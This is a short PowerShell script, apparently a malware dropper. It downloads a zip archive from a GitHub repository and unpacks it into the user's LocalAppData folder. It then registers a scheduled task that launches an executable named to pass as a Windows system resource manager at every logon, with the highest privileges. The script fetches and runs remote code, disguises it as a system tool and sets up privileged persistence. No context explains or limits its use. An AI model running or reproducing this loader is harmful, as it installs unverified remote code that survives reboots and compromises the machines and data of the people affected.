Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
Expand-Archive -Path "a.zip" -DestinationPath ".";
Remove-Item "a.zip";
Move-Item "Server" $env:LOCALAPPDATA;
schtasks.exe /create /tn "GerenciadorRecursos" /tr "'$env:LOCALAPPDATA\Server\Gerenciador de recursos do sistema.exe'" /sc onlogon /rl highest;